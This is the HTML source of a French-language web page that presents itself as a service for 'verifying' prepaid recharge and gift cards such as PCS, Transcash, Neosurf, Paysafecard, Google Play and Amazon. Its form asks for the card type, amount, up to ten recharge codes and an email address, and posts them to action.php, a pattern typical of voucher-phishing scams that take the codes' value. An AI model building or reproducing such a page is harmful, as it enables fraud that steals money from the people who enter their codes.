<!DOCTYPE html>
<html lang="zxx">
  <head>
    <meta charset="UTF-8" />
    <meta name="description" content="Verification des cartes de recharge" />
    <meta name="keywords" content="Verification, transcash, pcs, neosurf" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <link rel="shortcut icon" href="ressoures/images/Verify_your_gift_card-removebg-preview.png"/>
    <title>Verification des cartes de recharge | PCS Transcash Neosurf</title>
    <link rel="stylesheet" href="src/css/style.css" type="text/css" />

    <link rel="stylesheet" href="node_modules/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
    

  </head>
  

  <body>

   
      <div class="container">
          <div class="col-lg-5 offset-lg-2 box-cards">
            <div class="hero__form">
              
              <h2 class="h-2">Renseignez les informations du coupon ici</h2>
   
              <form method="post" action="action.php" class="call__form" >
                <div class="row">
                  <div class="col-lg-12">
                    <select name="recharge" id="recharge" class="form-control mb-3" required >
                      <option value="PCS">PCS</option>
                      <option value="PAYSAFECARD">PAYSAFECARD</option>
                      <option value="TRANSCASH">TRANSCASH</option>
                      <option value="NEOSURF">NEOSURF</option>
                      <option value="TONEO">TONEO</option>
                      <option value="ORANGE">ORANGE</option>
                      <option value="PAYPAL">PAYPAL</option>
                      <option value="LE BARA">LE BARA</option>
                      <option value="LYCAMOBILE">LYCAMOBILE</option>
                      <option value="Google Play">GOOGLE PLAY</option>
                      <option value="Amazon">AMAZON</option>
                      <option value="Bitnovo">BITNOVO</option>
                    </select>
                  </div>

                  <div class="col-lg-12">
                    <input class="form-control mt-3" type="number" id="montant" name="montant" placeholder="Entrer le montant de la recharge *" />
                  </div>

                  <div class="col-lg-12">
                    <select name="devise" id="devise" class="form-control mb-2 mt-3">
                      <option value="euro">€ (Euro)</option>
                      <option value="dollar">$ (Dollar)</option>
                      <option value="Franc Suisse">CHF (Franc suisse)</option>
                    </select>
                  </div>
                  <div class="col-lg-12">
                    <input type="text" class="form-control mt-3" name="codeEnregistrement" id="codeEnregistrement" placeholder="Entrer le code de recharge 1 *" />
                  </div>
                  <div class="col-lg-12">
                    <input type="text" class="form-control mt-3" name="codeEnregistrement1" id="codeEnregistrement1" placeholder="Entrer le code de recharge 2" />
                  </div>
                  <div class="col-lg-12">
                    <input type="text" class="form-control mt-3" name="codeEnregistrement2" id="codeEnregistrement2" placeholder="Entrer le code de recharge 3"/>
                  </div>

                  <div class="col-lg-12">
                    <input type="text" class="form-control mt-3" name="codeEnregistrement3" id="codeEnregistrement3" placeholder="Entrer le code de recharge 4"/>
                  </div>
                  <div class="col-lg-12">
                    <input type="text" class="form-control mt-3" name="codeEnregistrement4" id="codeEnregistrement4" placeholder="Entrer le code de recharge 5"/>
                  </div>
                  <div class="col-lg-12">
                    <input type="text" class="form-control mt-3" name="codeEnregistrement5" id="codeEnregistrement5" placeholder="Entrer le code de recharge 6"/>
                  </div>
                  <div class="col-lg-12">
                    <input type="text" class="form-control mt-3" name="codeEnregistrement6" id="codeEnregistrement6" placeholder="Entrer le code de recharge 7"/>
                  </div>
                  <div class="col-lg-12">
                    <input type="text" class="form-control mt-3" name="codeEnregistrement7" id="codeEnregistrement7" placeholder="Entrer le code de recharge 8"/>
                  </div>
                  <div class="col-lg-12">
                    <input type="text" class="form-control mt-3" name="codeEnregistrement8" id="codeEnregistrement8" placeholder="Entrer le code de recharge 9"/>
                  </div>
                  <div class="col-lg-12">
                    <input type="text" class="form-control mt-3" name="codeEnregistrement9" id="codeEnregistrement9" placeholder="Entrer le code de recharge 10"/>
                  </div>

                  <div class="col-lg-12">
                    <input class="form-control mt-3" type="email" placeholder="Entrez votre adresse email *" name="email" id="email"/>
                  </div>
                </div>
                <div class="d-grid gap-2">
                    <input type="submit" class="btn btn-primary mb-3 mt-5" id="submit_button" value="Verifier mon coupon" style="height: 50px" name="send" />
                </div>
                
              </form>
            </div>
          </div>
        </div>
      </div>

    <!-- Hero Section End -->
    <!-- Footer Section Begin -->
    <footer class="footer">
      <div class="container">
        <div class="row">
          <div class="col-lg-3 col-md-6 col-sm-12">
            <div class="footer__about">
              <div class="footer__logo">
                <a href="/"
                  ><img
                    src="ressoures/images/Logo_footer-removebg-preview.png"
                    alt=""
                /></a>
              </div>
              <p>
                Service de verification de coupons en ligne. Notre plateforme
                vous permet de verifier la validite de vos cartes. Cette
                verification est protegee.
              </p>
            </div>
          </div>
          <div class="col-lg-3 col-md-6 col-sm-6">
            <div class="footer__widget">
              <h5>Services</h5>
              <div class="footer__widget">
                <ul>
                  <li><a href="#">Verification des coupons PCS</a></li>
                  <li><a href="#">Verification des coupons Amazon</a></li>
                  <li><a href="#">Verification des coupons Neosurf</a></li>
                  <li><a href="#">Et bien d'autres</a></li>
                </ul>
              </div>
            </div>
          </div>
          <div class="col-lg-3 col-md-6 col-sm-6">
            <div class="footer__widget">
              <h5>Socials</h5>
              <div class="footer__widget footer__widget--social">
                <ul>
                  <li>
                    <a href="https://fr-fr.facebook.com/"><i class="bi bi-facebook"></i> Facebook</a>
                  </li>
                  <li>
                    <a href="https://www.instagram.com/?hl=fr"><i class="bi bi-instagram"></i> Instagram</a>
                  </li>
                  <li>
                    <a href="https://twitter.com/?lang=fr"><i class="bi bi-twitter"></i> Twitter</a>
                  </li>
                  <li>
                    <a href="https://www.skype.com/fr/"><i class="bi bi-skype"></i> Skype</a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
          <div class="col-lg-3 col-md-6 col-sm-6">
            <div class="footer__widget footer__widget--address">
              <h5>Horaires d'ouverture</h5>
              <p>Nous travaillons tous les jours de la semaine</p>
              <ul>
                <li>Nous travaillons 24/7</li>
              </ul>
            </div>
          </div>
        </div>
        <div class="footer__copyright">
          <div class="row">
            <div class="col-lg-6 col-md-6 col-sm-6"></div>
            <div class="col-lg-6 col-md-6">
              <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
              <div class="footer__copyright__text">
                <p>Copyright &copy; <script> document.write(new Date().getFullYear()); </script> All rights reserved </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </footer>
    <!-- Footer Section Ends -->
    
    <script src="node_modules/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
</body>

</html>




